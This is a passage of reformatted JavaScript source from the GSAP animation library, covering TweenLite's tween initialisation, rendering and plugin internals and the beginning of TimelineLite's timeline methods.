            : (r = r || t.document)
            ? r.querySelectorAll
              ? r.querySelectorAll(e)
              : r.getElementById("#" === e.charAt(0) ? e.substr(1) : e)
            : e;
        });
    var Y = [],
      j = {},
      V = /(?:(-|-=|\+=)?\d*\.?\d*(?:e[\-+]?\d+)?)[0-9]/gi,
      W = /[\+-]=-?[\.\d]/,
      U = (I._internals = {
        isArray: g,
        isSelector: M,
        lazyTweens: Y,
        blobDif: X,
      }),
      q = (I._plugins = {}),
      H = (U.tweenLookup = {}),
      G = 0,
      Q = (U.reservedProps = {
        ease: 1,
        delay: 1,
        overwrite: 1,
        onComplete: 1,
        onCompleteParams: 1,
        onCompleteScope: 1,
        useFrames: 1,
        runBackwards: 1,
        startAt: 1,
        onUpdate: 1,
        onUpdateParams: 1,
        onUpdateScope: 1,
        onStart: 1,
        onStartParams: 1,
        onStartScope: 1,
        onReverseComplete: 1,
        onReverseCompleteParams: 1,
        onReverseCompleteScope: 1,
        onRepeat: 1,
        onRepeatParams: 1,
        onRepeatScope: 1,
        easeParams: 1,
        yoyo: 1,
        immediateRender: 1,
        repeat: 1,
        repeatDelay: 1,
        data: 1,
        paused: 1,
        reversed: 1,
        autoCSS: 1,
        lazy: 1,
        onOverwrite: 1,
        callbackScope: 1,
        stringFilter: 1,
        id: 1,
        yoyoEase: 1,
        stagger: 1,
      }),
      Z = {
        none: 0,
        all: 1,
        auto: 2,
        concurrent: 3,
        allOnStart: 4,
        preexisting: 5,
        true: 1,
        false: 0,
      },
      $ = (k._rootFramesTimeline = new B()),
      K = (k._rootTimeline = new B()),
      J = 30,
      tt = (U.lazyRender = function () {
        var t,
          e,
          i = Y.length;
        for (j = {}, t = 0; t < i; t++)
          (e = Y[t]) &&
            !1 !== e._lazy &&
            (e.render(e._lazy[0], e._lazy[1], !0), (e._lazy = !1));
        Y.length = 0;
      });
    function et(t, e, i, r) {
      var n,
        s,
        o = t.vars.onOverwrite;
      return (
        o && (n = o(t, e, i, r)),
        (o = I.onOverwrite) && (s = o(t, e, i, r)),
        !1 !== n && !1 !== s
      );
    }
    (K._startTime = f.time),
      ($._startTime = f.frame),
      (K._active = $._active = !0),
      setTimeout(tt, 1),
      (k._updateRoot = I.render =
        function () {
          var t, e, i;
          if (
            (Y.length && tt(),
            K.render((f.time - K._startTime) * K._timeScale, !1, !1),
            $.render((f.frame - $._startTime) * $._timeScale, !1, !1),
            Y.length && tt(),
            f.frame >= J)
          ) {
            for (i in ((J = f.frame + (parseInt(I.autoSleep, 10) || 120)), H)) {
              for (t = (e = H[i].tweens).length; -1 < --t; )
                e[t]._gc && e.splice(t, 1);
              0 === e.length && delete H[i];
            }
            if (
              (!(i = K._first) || i._paused) &&
              I.autoSleep &&
              !$._first &&
              1 === f._listeners.tick.length
            ) {
              for (; i && i._paused; ) i = i._next;
              i || f.sleep();
            }
          }
        }),
      f.addEventListener("tick", k._updateRoot);
    var it = function (t, e, i) {
        var r,
          n,
          s = t._gsTweenID;
        if (
          (H[s || (t._gsTweenID = s = "t" + G++)] ||
            (H[s] = { target: t, tweens: [] }),
          e && (((r = H[s].tweens)[(n = r.length)] = e), i))
        )
          for (; -1 < --n; ) r[n] === e && r.splice(n, 1);
        return H[s].tweens;
      },
      rt = function (t, e, i, r, n) {
        var s, o, a, u;
        if (1 === r || 4 <= r) {
          for (u = n.length, s = 0; s < u; s++)
            if ((a = n[s]) !== e) a._gc || (a._kill(null, t, e) && (o = !0));
            else if (5 === r) break;
          return o;
        }
        var l,
          h = e._startTime + m,
          p = [],
          f = 0,
          c = 0 === e._duration;
        for (s = n.length; -1 < --s; )
          (a = n[s]) === e ||
            a._gc ||
            a._paused ||
            (a._timeline !== e._timeline
              ? ((l = l || nt(e, 0, c)), 0 === nt(a, l, c) && (p[f++] = a))
              : a._startTime <= h &&
                a._startTime + a.totalDuration() / a._timeScale > h &&
                (((c || !a._initted) && h - a._startTime <= 2e-8) ||
                  (p[f++] = a)));
        for (s = f; -1 < --s; )
          if (
            ((u = (a = p[s])._firstPT),
            2 === r && a._kill(i, t, e) && (o = !0),
            2 !== r || (!a._firstPT && a._initted && u))
          ) {
            if (2 !== r && !et(a, e)) continue;
            a._enabled(!1, !1) && (o = !0);
          }
        return o;
      },
      nt = function (t, e, i) {
        for (
          var r = t._timeline, n = r._timeScale, s = t._startTime;
          r._timeline;

        ) {
          if (((s += r._startTime), (n *= r._timeScale), r._paused))
            return -100;
          r = r._timeline;
        }
        return e < (s /= n)
          ? s - e
          : (i && s === e) || (!t._initted && s - e < 2e-8)
          ? m
          : (s += t.totalDuration() / t._timeScale / n) > e + m
          ? 0
          : s - e - m;
      };
    (p._init = function () {
      var t,
        e,
        i,
        r,
        n,
        s,
        o = this.vars,
        a = this._overwrittenProps,
        u = this._duration,
        l = !!o.immediateRender,
        h = o.ease,
        p = this._startAt;
      if (o.startAt) {
        for (r in (p && (p.render(-1, !0), p.kill()), (n = {}), o.startAt))
          n[r] = o.startAt[r];
        if (
          ((n.data = "isStart"),
          (n.overwrite = !1),
          (n.immediateRender = !0),
          (n.lazy = l && !1 !== o.lazy),
          (n.startAt = n.delay = null),
          (n.onUpdate = o.onUpdate),
          (n.onUpdateParams = o.onUpdateParams),
          (n.onUpdateScope = o.onUpdateScope || o.callbackScope || this),
          (this._startAt = I.to(this.target || {}, 0, n)),
          l)
        )
          if (0 < this._time) this._startAt = null;
          else if (0 !== u) return;
      } else if (o.runBackwards && 0 !== u)
        if (p) p.render(-1, !0), p.kill(), (this._startAt = null);
        else {
          for (r in (0 !== this._time && (l = !1), (i = {}), o))
            (Q[r] && "autoCSS" !== r) || (i[r] = o[r]);
          if (
            ((i.overwrite = 0),
            (i.data = "isFromStart"),
            (i.lazy = l && !1 !== o.lazy),
            (i.immediateRender = l),
            (this._startAt = I.to(this.target, 0, i)),
            l)
          ) {
            if (0 === this._time) return;
          } else
            this._startAt._init(),
              this._startAt._enabled(!1),
              this.vars.immediateRender && (this._startAt = null);
        }
      if (
        ((this._ease = h =
          h
            ? h instanceof T
              ? h
              : "function" == typeof h
              ? new T(h, o.easeParams)
              : w[h] || I.defaultEase
            : I.defaultEase),
        o.easeParams instanceof Array &&
          h.config &&
          (this._ease = h.config.apply(h, o.easeParams)),
        (this._easeType = this._ease._type),
        (this._easePower = this._ease._power),
        (this._firstPT = null),
        this._targets)
      )
        for (s = this._targets.length, t = 0; t < s; t++)
          this._initProps(
            this._targets[t],
            (this._propLookup[t] = {}),
            this._siblings[t],
            a ? a[t] : null,
            t
          ) && (e = !0);
      else
        e = this._initProps(
          this.target,
          this._propLookup,
          this._siblings,
          a,
          0
        );
      if (
        (e && I._onPluginEvent("_onInitAllProps", this),
        a &&
          (this._firstPT ||
            ("function" != typeof this.target && this._enabled(!1, !1))),
        o.runBackwards)
      )
        for (i = this._firstPT; i; ) (i.s += i.c), (i.c = -i.c), (i = i._next);
      (this._onUpdate = o.onUpdate), (this._initted = !0);
    }),
      (p._initProps = function (e, i, r, n, s) {
        var o, a, u, l, h, p;
        if (null == e) return !1;
        for (o in (j[e._gsTweenID] && tt(),
        this.vars.css ||
          (e.style &&
            e !== t &&
            e.nodeType &&
            q.css &&
            !1 !== this.vars.autoCSS &&
            (function (t, e) {
              var i,
                r = {};
              for (i in t)
                Q[i] ||
                  (i in e &&
                    "transform" !== i &&
                    "x" !== i &&
                    "y" !== i &&
                    "width" !== i &&
                    "height" !== i &&
                    "className" !== i &&
                    "border" !== i) ||
                  !(!q[i] || (q[i] && q[i]._autoCSS)) ||
                  ((r[i] = t[i]), delete t[i]);
              t.css = r;
            })(this.vars, e)),
        this.vars))
          if (((p = this.vars[o]), Q[o]))
            p &&
              (p instanceof Array || (p.push && g(p))) &&
              -1 !== p.join("").indexOf("{self}") &&
              (this.vars[o] = p = this._swapSelfInParams(p, this));
          else if (
            q[o] &&
            (l = new q[o]())._onInitTween(e, this.vars[o], this, s)
          ) {
            for (
              this._firstPT = h =
                {
                  _next: this._firstPT,
                  t: l,
                  p: "setRatio",
                  s: 0,
                  c: 1,
                  f: 1,
                  n: o,
                  pg: 1,
                  pr: l._priority,
                  m: 0,
                },
                a = l._overwriteProps.length;
              -1 < --a;

            )
              i[l._overwriteProps[a]] = this._firstPT;
            (l._priority || l._onInitAllProps) && (u = !0),
              (l._onDisable || l._onEnable) &&
                (this._notifyPluginsOfEnabled = !0),
              h._next && (h._next._prev = h);
          } else
            i[o] = z.call(
              this,
              e,
              o,
              "get",
              p,
              o,
              0,
              null,
              this.vars.stringFilter,
              s
            );
        return n && this._kill(n, e)
          ? this._initProps(e, i, r, n, s)
          : 1 < this._overwrite &&
            this._firstPT &&
            1 < r.length &&
            rt(e, this, i, this._overwrite, r)
          ? (this._kill(i, e), this._initProps(e, i, r, n, s))
          : (this._firstPT &&
              ((!1 !== this.vars.lazy && this._duration) ||
                (this.vars.lazy && !this._duration)) &&
              (j[e._gsTweenID] = !0),
            u);
      }),
      (p.render = function (t, e, i) {
        var r,
          n,
          s,
          o,
          a = this,
          u = a._time,
          l = a._duration,
          h = a._rawPrevTime;
        if (l - m <= t && 0 <= t)
          (a._totalTime = a._time = l),
            (a.ratio = a._ease._calcEnd ? a._ease.getRatio(1) : 1),
            a._reversed ||
              ((r = !0),
              (n = "onComplete"),
              (i = i || a._timeline.autoRemoveChildren)),
            0 !== l ||
              (!a._initted && a.vars.lazy && !i) ||
              (a._startTime === a._timeline._duration && (t = 0),
              (h < 0 ||
                (t <= 0 && -m <= t) ||
                (h === m && "isPause" !== a.data)) &&
                h !== t &&
                ((i = !0), m < h && (n = "onReverseComplete")),
              (a._rawPrevTime = o = !e || t || h === t ? t : m));
        else if (t < m)
          (a._totalTime = a._time = 0),
            (a.ratio = a._ease._calcEnd ? a._ease.getRatio(0) : 0),
            (0 !== u || (0 === l && 0 < h)) &&
              ((n = "onReverseComplete"), (r = a._reversed)),
            -m < t
              ? (t = 0)
              : t < 0 &&
                ((a._active = !1),
                0 !== l ||
                  (!a._initted && a.vars.lazy && !i) ||
                  (0 <= h && (h !== m || "isPause" !== a.data) && (i = !0),
                  (a._rawPrevTime = o = !e || t || h === t ? t : m))),
            (!a._initted || (a._startAt && a._startAt.progress())) && (i = !0);
        else if (((a._totalTime = a._time = t), a._easeType)) {
          var p = t / l,
            f = a._easeType,
            c = a._easePower;
          (1 === f || (3 === f && 0.5 <= p)) && (p = 1 - p),
            3 === f && (p *= 2),
            1 === c
              ? (p *= p)
              : 2 === c
              ? (p *= p * p)
              : 3 === c
              ? (p *= p * p * p)
              : 4 === c && (p *= p * p * p * p),
            (a.ratio =
              1 === f ? 1 - p : 2 === f ? p : t / l < 0.5 ? p / 2 : 1 - p / 2);
        } else a.ratio = a._ease.getRatio(t / l);
        if (a._time !== u || i) {
          if (!a._initted) {
            if ((a._init(), !a._initted || a._gc)) return;
            if (
              !i &&
              a._firstPT &&
              ((!1 !== a.vars.lazy && a._duration) ||
                (a.vars.lazy && !a._duration))
            )
              return (
                (a._time = a._totalTime = u),
                (a._rawPrevTime = h),
                Y.push(a),
                void (a._lazy = [t, e])
              );
            a._time && !r
              ? (a.ratio = a._ease.getRatio(a._time / l))
              : r &&
                a._ease._calcEnd &&
                (a.ratio = a._ease.getRatio(0 === a._time ? 0 : 1));
          }
          for (
            !1 !== a._lazy && (a._lazy = !1),
              a._active ||
                (!a._paused && a._time !== u && 0 <= t && (a._active = !0)),
              0 === u &&
                (a._startAt &&
                  (0 <= t
                    ? a._startAt.render(t, !0, i)
                    : (n = n || "_dummyGS")),
                !a.vars.onStart ||
                  (0 === a._time && 0 !== l) ||
                  e ||
                  a._callback("onStart")),
              s = a._firstPT;
            s;

          )
            s.f
              ? s.t[s.p](s.c * a.ratio + s.s)
              : (s.t[s.p] = s.c * a.ratio + s.s),
              (s = s._next);
          a._onUpdate &&
            (t < 0 && a._startAt && -1e-4 !== t && a._startAt.render(t, !0, i),
            e || ((a._time !== u || r || i) && a._callback("onUpdate"))),
            !n ||
              (a._gc && !i) ||
              (t < 0 &&
                a._startAt &&
                !a._onUpdate &&
                -1e-4 !== t &&
                a._startAt.render(t, !0, i),
              r &&
                (a._timeline.autoRemoveChildren && a._enabled(!1, !1),
                (a._active = !1)),
              !e && a.vars[n] && a._callback(n),
              0 === l &&
                a._rawPrevTime === m &&
                o !== m &&
                (a._rawPrevTime = 0));
        }
      }),
      (p._kill = function (t, e, i) {
        if (
          ("all" === t && (t = null),
          null == t && (null == e || e === this.target))
        )
          return (this._lazy = !1), this._enabled(!1, !1);
        e =
          "string" != typeof e
            ? e || this._targets || this.target
            : I.selector(e) || e;
        var r,
          n,
          s,
          o,
          a,
          u,
          l,
          h,
          p,
          f =
            i &&
            this._time &&
            i._startTime === this._startTime &&
            this._timeline === i._timeline,
          c = this._firstPT;
        if ((g(e) || M(e)) && "number" != typeof e[0])
          for (r = e.length; -1 < --r; ) this._kill(t, e[r], i) && (u = !0);
        else {
          if (this._targets) {
            for (r = this._targets.length; -1 < --r; )
              if (e === this._targets[r]) {
                (a = this._propLookup[r] || {}),
                  (this._overwrittenProps = this._overwrittenProps || []),
                  (n = this._overwrittenProps[r] =
                    t ? this._overwrittenProps[r] || {} : "all");
                break;
              }
          } else {
            if (e !== this.target) return !1;
            (a = this._propLookup),
              (n = this._overwrittenProps =
                t ? this._overwrittenProps || {} : "all");
          }
          if (a) {
            if (
              ((l = t || a),
              (h =
                t !== n &&
                "all" !== n &&
                t !== a &&
                ("object" != typeof t || !t._tempKill)),
              i && (I.onOverwrite || this.vars.onOverwrite))
            ) {
              for (s in l) a[s] && (p = p || []).push(s);
              if ((p || !t) && !et(this, i, e, p)) return !1;
            }
            for (s in l)
              (o = a[s]) &&
                (f && (o.f ? o.t[o.p](o.s) : (o.t[o.p] = o.s), (u = !0)),
                o.pg && o.t._kill(l) && (u = !0),
                (o.pg && 0 !== o.t._overwriteProps.length) ||
                  (o._prev
                    ? (o._prev._next = o._next)
                    : o === this._firstPT && (this._firstPT = o._next),
                  o._next && (o._next._prev = o._prev),
                  (o._next = o._prev = null)),
                delete a[s]),
                h && (n[s] = 1);
            !this._firstPT && this._initted && c && this._enabled(!1, !1);
          }
        }
        return u;
      }),
      (p.invalidate = function () {
        this._notifyPluginsOfEnabled && I._onPluginEvent("_onDisable", this);
        var t = this._time;
        return (
          (this._firstPT =
            this._overwrittenProps =
            this._startAt =
            this._onUpdate =
              null),
          (this._notifyPluginsOfEnabled = this._active = this._lazy = !1),
          (this._propLookup = this._targets ? {} : []),
          k.prototype.invalidate.call(this),
          this.vars.immediateRender &&
            ((this._time = -m), this.render(t, !1, !1 !== this.vars.lazy)),
          this
        );
      }),
      (p._enabled = function (t, e) {
        if ((c || f.wake(), t && this._gc)) {
          var i,
            r = this._targets;
          if (r)
            for (i = r.length; -1 < --i; )
              this._siblings[i] = it(r[i], this, !0);
          else this._siblings = it(this.target, this, !0);
        }
        return (
          k.prototype._enabled.call(this, t, e),
          !(!this._notifyPluginsOfEnabled || !this._firstPT) &&
            I._onPluginEvent(t ? "_onEnable" : "_onDisable", this)
        );
      }),
      (I.to = function (t, e, i) {
        return new I(t, e, i);
      }),
      (I.from = function (t, e, i) {
        return (
          (i.runBackwards = !0),
          (i.immediateRender = 0 != i.immediateRender),
          new I(t, e, i)
        );
      }),
      (I.fromTo = function (t, e, i, r) {
        return (
          (r.startAt = i),
          (r.immediateRender =
            0 != r.immediateRender && 0 != i.immediateRender),
          new I(t, e, r)
        );
      }),
      (I.delayedCall = function (t, e, i, r, n) {
        return new I(e, 0, {
          delay: t,
          onComplete: e,
          onCompleteParams: i,
          callbackScope: r,
          onReverseComplete: e,
          onReverseCompleteParams: i,
          immediateRender: !1,
          lazy: !1,
          useFrames: n,
          overwrite: 0,
        });
      }),
      (I.set = function (t, e) {
        return new I(t, 0, e);
      }),
      (I.getTweensOf = function (t, e) {
        if (null == t) return [];
        var i, r, n, s;
        if (
          ((t = "string" != typeof t ? t : I.selector(t) || t),
          (g(t) || M(t)) && "number" != typeof t[0])
        ) {
          for (i = t.length, r = []; -1 < --i; )
            r = r.concat(I.getTweensOf(t[i], e));
          for (i = r.length; -1 < --i; )
            for (s = r[i], n = i; -1 < --n; ) s === r[n] && r.splice(i, 1);
        } else if (t._gsTweenID)
          for (i = (r = it(t).concat()).length; -1 < --i; )
            (r[i]._gc || (e && !r[i].isActive())) && r.splice(i, 1);
        return r || [];
      }),
      (I.killTweensOf = I.killDelayedCallsTo =
        function (t, e, i) {
          "object" == typeof e && ((i = e), (e = !1));
          for (var r = I.getTweensOf(t, e), n = r.length; -1 < --n; )
            r[n]._kill(i, t);
        });
    var st = C(
      "plugins.TweenPlugin",
      function (t, e) {
        (this._overwriteProps = (t || "").split(",")),
          (this._propName = this._overwriteProps[0]),
          (this._priority = e || 0),
          (this._super = st.prototype);
      },
      !0
    );
    if (
      ((p = st.prototype),
      (st.version = "1.19.0"),
      (st.API = 2),
      (p._firstPT = null),
      (p._addTween = z),
      (p.setRatio = N),
      (p._kill = function (t) {
        var e,
          i = this._overwriteProps,
          r = this._firstPT;
        if (null != t[this._propName]) this._overwriteProps = [];
        else for (e = i.length; -1 < --e; ) null != t[i[e]] && i.splice(e, 1);
        for (; r; )
          null != t[r.n] &&
            (r._next && (r._next._prev = r._prev),
            r._prev
              ? ((r._prev._next = r._next), (r._prev = null))
              : this._firstPT === r && (this._firstPT = r._next)),
            (r = r._next);
        return !1;
      }),
      (p._mod = p._roundProps =
        function (t) {
          for (var e, i = this._firstPT; i; )
            (e =
              t[this._propName] ||
              (null != i.n && t[i.n.split(this._propName + "_").join("")])) &&
              "function" == typeof e &&
              (2 === i.f ? (i.t._applyPT.m = e) : (i.m = e)),
              (i = i._next);
        }),
      (I._onPluginEvent = function (t, e) {
        var i,
          r,
          n,
          s,
          o,
          a = e._firstPT;
        if ("_onInitAllProps" === t) {
          for (; a; ) {
            for (o = a._next, r = n; r && r.pr > a.pr; ) r = r._next;
            (a._prev = r ? r._prev : s) ? (a._prev._next = a) : (n = a),
              (a._next = r) ? (r._prev = a) : (s = a),
              (a = o);
          }
          a = e._firstPT = n;
        }
        for (; a; )
          a.pg && "function" == typeof a.t[t] && a.t[t]() && (i = !0),
            (a = a._next);
        return i;
      }),
      (st.activate = function (t) {
        for (var e = t.length; -1 < --e; )
          t[e].API === st.API && (q[new t[e]()._propName] = t[e]);
        return !0;
      }),
      (x.plugin = function (t) {
        if (!(t && t.propName && t.init && t.API))
          throw "illegal plugin definition.";
        var e,
          i = t.propName,
          r = t.priority || 0,
          n = t.overwriteProps,
          s = {
            init: "_onInitTween",
            set: "setRatio",
            kill: "_kill",
            round: "_mod",
            mod: "_mod",
            initAll: "_onInitAllProps",
          },
          o = C(
            "plugins." + i.charAt(0).toUpperCase() + i.substr(1) + "Plugin",
            function () {
              st.call(this, i, r), (this._overwriteProps = n || []);
            },
            !0 === t.global
          ),
          a = (o.prototype = new st(i));
        for (e in (((a.constructor = o).API = t.API), s))
          "function" == typeof t[e] && (a[s[e]] = t[e]);
        return (o.version = t.version), st.activate([o]), o;
      }),
      (l = t._gsQueue))
    ) {
      for (h = 0; h < l.length; h++) l[h]();
      for (p in y)
        y[p].func || t.console.log("GSAP encountered missing dependency: " + p);
    }
    c = !1;
  })(
    "undefined" != typeof module &&
      module.exports &&
      "undefined" != typeof global
      ? global
      : this || window,
    "TweenLite"
  ),
  (
    (_gsScope =
      "undefined" != typeof module &&
      module.exports &&
      "undefined" != typeof global
        ? global
        : this || window)._gsQueue || (_gsScope._gsQueue = [])
  ).push(function () {
    "use strict";
    _gsScope._gsDefine(
      "TimelineLite",
      ["core.Animation", "core.SimpleTimeline", "TweenLite"],
      function (t, e, i) {
        function r(t) {
          e.call(this, t);
          var i,
            r,
            n = this,
            s = n.vars;
          for (r in ((n._labels = {}),
          (n.autoRemoveChildren = !!s.autoRemoveChildren),
          (n.smoothChildTiming = !!s.smoothChildTiming),
          (n._sortChildren = !0),
          (n._onUpdate = s.onUpdate),
          s))
            (i = s[r]),
              f(i) &&
                -1 !== i.join("").indexOf("{self}") &&
                (s[r] = n._swapSelfInParams(i));
          f(s.tweens) && n.add(s.tweens, 0, s.align, s.stagger);
        }
        function n(t) {
          var e,
            i = {};
          for (e in t) i[e] = t[e];
          return i;
        }
        function s(t, e, i) {
          var r,
            n,
            s = t.cycle;
          for (r in s)
            (n = s[r]),
              (t[r] = "function" == typeof n ? n(i, e[i], e) : n[i % n.length]);
          delete t.cycle;
        }
        function o(t, e, i, r) {
          var n = "immediateRender";
          return n in e || (e[n] = !((i && !1 === i[n]) || r)), e;
        }
        function a(t) {
          if ("function" == typeof t) return t;
          var e = "object" == typeof t ? t : { each: t },
            i = e.ease,
            r = e.from || 0,
            n = e.base || 0,
            s = {},
            o = isNaN(r),
            a = e.axis,
            u = { center: 0.5, end: 1 }[r] || 0;
          return function (t, l, h) {
            var p,
              f,
              c,
              D,
              _,
              d,
              m,
              g,
              y,
              v = (h || e).length,
              x = s[v];
            if (!x) {
              if (!(y = "auto" === e.grid ? 0 : (e.grid || [1 / 0])[0])) {
                for (
                  m = -1 / 0;
                  m < (m = h[y++].getBoundingClientRect().left) && y < v;

                );
                y--;
              }
              for (
                x = s[v] = [],
                  p = o ? Math.min(y, v) * u - 0.5 : r % y,
                  f = o ? (v * u) / y - 0.5 : (r / y) | 0,
                  g = 1 / (m = 0),
                  d = 0;
                d < v;
                d++
              )
                (c = (d % y) - p),
                  (D = f - ((d / y) | 0)),
                  (x[d] = _ =
                    a ? Math.abs("y" === a ? D : c) : Math.sqrt(c * c + D * D)),
                  m < _ && (m = _),
                  _ < g && (g = _);
              (x.max = m - g),
                (x.min = g),
                (x.v = v =
                  e.amount ||
                  e.each *
                    (v < y
                      ? v
                      : a
                      ? "y" === a
                        ? v / y
                        : y
                      : Math.max(y, v / y)) ||
                  0),
                (x.b = v < 0 ? n - v : n);
            }
            return (
              (v = (x[t] - x.min) / x.max), x.b + (i ? i.getRatio(v) : v) * x.v
            );
          };
        }
        var u = 1e-8,
          l = i._internals,
          h = (r._internals = {}),
          p = l.isSelector,
          f = l.isArray,
          c = l.lazyTweens,
          D = l.lazyRender,
          _ = _gsScope._gsDefine.globals,
          d = (h.pauseCallback = function () {}),
          m = (r.prototype = new e());
        return (
          (r.version = "2.1.2"),
          (r.distribute = a),
          (m.constructor = r),
          (m.kill()._gc = m._forcingPlayhead = m._hasPause = !1),
          (m.to = function (t, e, r, n) {
            var s = (r.repeat && _.TweenMax) || i;
            return e ? this.add(new s(t, e, r), n) : this.set(t, r, n);
          }),
          (m.from = function (t, e, r, n) {
            return this.add(
              ((r.repeat && _.TweenMax) || i).from(t, e, o(0, r)),
              n
            );
          }),
          (m.fromTo = function (t, e, r, n, s) {
            var a = (n.repeat && _.TweenMax) || i;
            return (
              (n = o(0, n, r)),
              e ? this.add(a.fromTo(t, e, r, n), s) : this.set(t, n, s)
            );
          }),
          (m.staggerTo = function (t, e, o, u, l, h, f, c) {
            var D,
              _,
              d = new r({
                onComplete: h,
                onCompleteParams: f,
                callbackScope: c,
                smoothChildTiming: this.smoothChildTiming,
              }),
              m = a(o.stagger || u),
              g = o.startAt,
              y = o.cycle;
            for (
              "string" == typeof t && (t = i.selector(t) || t),
                p((t = t || [])) &&
                  (t = (function (t) {
                    var e,
                      i = [],
                      r = t.length;
                    for (e = 0; e !== r; i.push(t[e++]));
                    return i;
                  })(t)),
                _ = 0;
              _ < t.length;
              _++
            )
              (D = n(o)),
                g && ((D.startAt = n(g)), g.cycle && s(D.startAt, t, _)),
                y &&
                  (s(D, t, _),
                  null != D.duration && ((e = D.duration), delete D.duration)),
                d.to(t[_], e, D, m(_, t[_], t));
            return this.add(d, l);
          }),
          (m.staggerFrom = function (t, e, i, r, n, s, a, u) {
            return (
              (i.runBackwards = !0),
              this.staggerTo(t, e, o(0, i), r, n, s, a, u)
            );
          }),
          (m.staggerFromTo = function (t, e, i, r, n, s, a, u, l) {
            return (
              (r.startAt = i), this.staggerTo(t, e, o(0, r, i), n, s, a, u, l)
            );
          }),
          (m.call = function (t, e, r, n) {
            return this.add(i.delayedCall(0, t, e, r), n);
          }),
          (m.set = function (t, e, r) {
            return this.add(new i(t, 0, o(0, e, null, !0)), r);
          }),
          (r.exportRoot = function (t, e) {
            null == (t = t || {}).smoothChildTiming &&
              (t.smoothChildTiming = !0);
            var n,
              s,
              o,
              a,
              u = new r(t),
              l = u._timeline;
            for (
              null == e && (e = !0),
                l._remove(u, !0),
                u._startTime = 0,
                u._rawPrevTime = u._time = u._totalTime = l._time,
                o = l._first;
              o;

            )
              (a = o._next),
                (e && o instanceof i && o.target === o.vars.onComplete) ||
                  ((s = o._startTime - o._delay) < 0 && (n = 1), u.add(o, s)),
                (o = a);
            return l.add(u, 0), n && u.totalDuration(), u;
          }),
          (m.add = function (n, s, o, a) {
            var u,
              l,
              h,
              p,
              c,
              D,
              _ = this;
            if (
              ("number" != typeof s && (s = _._parseTimeOrLabel(s, 0, !0, n)),
              !(n instanceof t))
            ) {
              if (n instanceof Array || (n && n.push && f(n))) {
                for (
                  o = o || "normal", a = a || 0, u = s, l = n.length, h = 0;
                  h < l;
                  h++
                )
                  f((p = n[h])) && (p = new r({ tweens: p })),
                    _.add(p, u),
                    "string" != typeof p &&
                      "function" != typeof p &&
                      ("sequence" === o
                        ? (u = p._startTime + p.totalDuration() / p._timeScale)
                        : "start" === o && (p._startTime -= p.delay())),
                    (u += a);
                return _._uncache(!0);
              }
              if ("string" == typeof n) return _.addLabel(n, s);
              if ("function" != typeof n)
                throw (
                  "Cannot add " +
                  n +
                  " into the timeline; it is not a tween, timeline, function, or string."
                );
              n = i.delayedCall(0, n);
            }
            if (
              (e.prototype.add.call(_, n, s),
              (n._time || (!n._duration && n._initted)) &&
                ((u = (_.rawTime() - n._startTime) * n._timeScale),
                (!n._duration ||
                  1e-5 <
                    Math.abs(Math.max(0, Math.min(n.totalDuration(), u))) -
                      n._totalTime) &&
                  n.render(u, !1, !1)),
              (_._gc || _._time === _._duration) &&
                !_._paused &&
                _._duration < _.duration())
            )
              for (D = (c = _).rawTime() > n._startTime; c._timeline; )
                D && c._timeline.smoothChildTiming
                  ? c.totalTime(c._totalTime, !0)
                  : c._gc && c._enabled(!0, !1),
                  (c = c._timeline);
            return _;
          }),
          (m.remove = function (e) {
            if (e instanceof t) {
              this._remove(e, !1);
              var i = (e._timeline = e.vars.useFrames
                ? t._rootFramesTimeline
                : t._rootTimeline);
              return (
                (e._startTime =
                  (e._paused ? e._pauseTime : i._time) -
                  (e._reversed
                    ? e.totalDuration() - e._totalTime
                    : e._totalTime) /
                    e._timeScale),
                this
              );
            }
            if (e instanceof Array || (e && e.push && f(e))) {
              for (var r = e.length; -1 < --r; ) this.remove(e[r]);
              return this;
            }
            return "string" == typeof e
              ? this.removeLabel(e)
              : this.kill(null, e);
          }),
          (m._remove = function (t, i) {
            return (
              e.prototype._remove.call(this, t, i),
              this._last
                ? this._time > this.duration() &&
                  ((this._time = this._duration),
                  (this._totalTime = this._totalDuration))
                : (this._time =
                    this._totalTime =
                    this._duration =
                    this._totalDuration =
                      0),
              this
            );
          }),
          (m.append = function (t, e) {
            return this.add(t, this._parseTimeOrLabel(null, e, !0, t));
          }),
          (m.insert = m.insertMultiple =
            function (t, e, i, r) {
              return this.add(t, e || 0, i, r);
            }),
          (m.appendMultiple = function (t, e, i, r) {
            return this.add(t, this._parseTimeOrLabel(null, e, !0, t), i, r);
          }),
          (m.addLabel = function (t, e) {
            return (this._labels[t] = this._parseTimeOrLabel(e)), this;
          }),
          (m.addPause = function (t, e, r, n) {
            var s = i.delayedCall(0, d, r, n || this);
            return (
              (s.vars.onComplete = s.vars.onReverseComplete = e),
              (s.data = "isPause"),
              (this._hasPause = !0),
              this.add(s, t)
            );
          }),
          (m.removeLabel = function (t) {
            return delete this._labels[t], this;
          }),
          (m.getLabelTime = function (t) {
            return null != this._labels[t] ? this._labels[t] : -1;
          }),
          (m._parseTimeOrLabel = function (e, i, r, n) {
            var s, o;
            if (n instanceof t && n.timeline === this) this.remove(n);
            else if (n && (n instanceof Array || (n.push && f(n))))
              for (o = n.length; -1 < --o; )
                n[o] instanceof t &&
                  n[o].timeline === this &&
                  this.remove(n[o]);
            if (
              ((s =
                "number" != typeof e || i
                  ? 99999999999 < this.duration()
                    ? this.recent().endTime(!1)
                    : this._duration
                  : 0),
              "string" == typeof i)
            )
              return this._parseTimeOrLabel(
                i,
                r && "number" == typeof e && null == this._labels[i]
                  ? e - s
                  : 0,
                r
              );
            if (
              ((i = i || 0),
              "string" != typeof e || (!isNaN(e) && null == this._labels[e]))
            )
              null == e && (e = s);
            else {
              if (-1 === (o = e.indexOf("=")))
                return null == this._labels[e]
                  ? r
                    ? (this._labels[e] = s + i)
                    : i
                  : this._labels[e] + i;
              (i =
                parseInt(e.charAt(o - 1) + "1", 10) * Number(e.substr(o + 1))),
                (e =
                  1 < o ? this._parseTimeOrLabel(e.substr(0, o - 1), 0, r) : s);
            }
            return Number(e) + i;
          }),
          (m.seek = function (t, e) {
            return this.totalTime(
              "number" == typeof t ? t : this._parseTimeOrLabel(t),
              !1 !== e
            );
          }),
          (m.stop = function () {
            return this.paused(!0);
          }),
          (m.gotoAndPlay = function (t, e) {
            return this.play(t, e);
          }),
          (m.gotoAndStop = function (t, e) {
            return this.pause(t, e);
          }),
          (m.render = function (t, e, i) {
            this._gc && this._enabled(!0, !1);
            var r,
              n,
              s,
              o,
              a,
              l,
              h,
              p,
              f = this,
              _ = f._time,
              d = f._dirty ? f.totalDuration() : f._totalDuration,
              m = f._startTime,
              g = f._timeScale,
              y = f._paused;
